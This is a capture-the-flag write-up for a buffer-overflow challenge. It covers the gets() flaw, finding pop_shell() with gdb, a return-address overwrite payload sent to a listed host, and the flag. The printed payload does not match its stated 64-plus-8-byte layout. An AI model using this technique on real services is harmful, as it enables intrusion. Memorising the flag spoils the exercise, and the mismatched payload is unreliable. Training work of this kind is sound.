### **Challenge Name: Exploit 100 - A Finer Token Never Was**

---

### **Description**

Here's a simple exploit challenge for you. There's a little bit of a twist to make sure it's not too easy, but it's otherwise a straightforward challenge.

#### **Target**  
`35.184.182.18 32002`

#### **Files Provided**  
- [Exploit100-1](Resources/Exploit100-1)  
- [Exploit100-1.c](Resources/Exploit100-1.c)

---

### **Approach**

#### **Step 1: Analyze the Source Code**
Examined `Exploit100-1.c` and identified a **buffer overflow vulnerability** due to the use of `gets()` without size constraints. 

#### **Step 2: Identify Vulnerable Function**
Located the function to exploit:  

```c
void pop_shell() {
    system("/bin/sh");
}
```

The goal is to overwrite the return address on the stack with the address of `pop_shell()`.

#### **Step 3: Find the Address of `pop_shell()`**
Used **gdb** to find the address of `pop_shell()`:

```bash
gdb Exploit100-1
(gdb) disassemble pop_shell
```

Result:  
`pop_shell()` is located at `0x0000000000401152`.

#### **Step 4: Construct Payload**
Calculated the buffer size:  
- Buffer: 64 bytes  
- Saved register space: 8 bytes  

Payload structure:  
`<64 'A's><8 'B's><Address of pop_shell()>`

Payload in little-endian format:  
```
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaabbbbbbbbbbbbbbbbbbbbbb\x52\x11\x40
```

#### **Step 5: Exploit the Target**
Wrote the payload to a script [payload.py](Resources/payload.py) to send it to the target. This executed the `pop_shell()` function and provided shell access.

#### **Step 6: Retrieve the Flag**
Navigated the shell to locate and read the flag:

```bash
ls
cd home
cd Exploit100-1
ls
cat Exploit100-1.txt
```

Output:  
`poctf{uwsp_411_4n1m4l5_4r3_3qu41}`

---

### **Flag**

`poctf{uwsp_411_4n1m4l5_4r3_3qu41}`

---